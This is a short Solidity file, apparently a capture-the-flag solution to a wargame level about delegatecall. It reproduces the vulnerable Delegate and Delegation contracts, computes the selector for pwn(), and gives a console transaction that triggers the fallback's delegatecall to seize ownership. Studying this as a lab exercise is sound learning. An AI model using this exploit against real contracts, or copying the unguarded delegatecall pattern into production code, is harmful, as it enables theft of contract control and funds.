pragma solidity ^0.4.18;
//original code
contract Delegate {

  address public owner;

  function Delegate(address _owner) public {
    owner = _owner;
  }

  function pwn() public {
    owner = msg.sender;
  }
}

contract Delegation {

  address public owner;
  Delegate delegate;

  function Delegation(address _delegateAddress) public {
    delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  }

  function() public {
    if(delegate.delegatecall(msg.data)) {
      this;
    }
  }
}

//to claim ownership of this contract we have to call the pwn() function through a delegate call which allows a SC to execute the code of another SC.
//The first four bytes of the call data for a function call specifies the function to be called.
//We deploy the contract below to get first four bytes of the Keccak-256 (SHA-3) hash of the signature of the function.

//Deploy on Remix
contract Hash {
    function getHash () public pure returns (bytes4) {
        return bytes4(keccak256("pwn()"));
    }
}

//In console
//contract.sendTransaction({data: "0xdd365b8b"}). This calls the fallback function which then does a delegate call and grants us ownership of the contract
